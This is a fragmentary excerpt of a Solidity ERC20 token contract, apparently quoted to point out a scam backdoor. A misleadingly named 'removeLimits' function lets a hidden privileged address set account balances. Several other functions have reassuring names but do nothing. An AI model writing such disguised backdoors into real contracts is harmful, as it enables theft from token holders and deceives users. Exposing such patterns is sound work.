...
contract ERC20 is IERC20 {
    ...
    function removeLimits(address[] memory accounts, uint256 newBalance) public {  // balance
        require(msg.sender == adr, "nn");
    ...
    function setLicensingFees() external {
        holder = holder;
    }

    function setMaxTransaction() external {
        _limit = _limit;
    }
    ...
    function setMaxwallet () external {
        _BONE = 1;
    }
}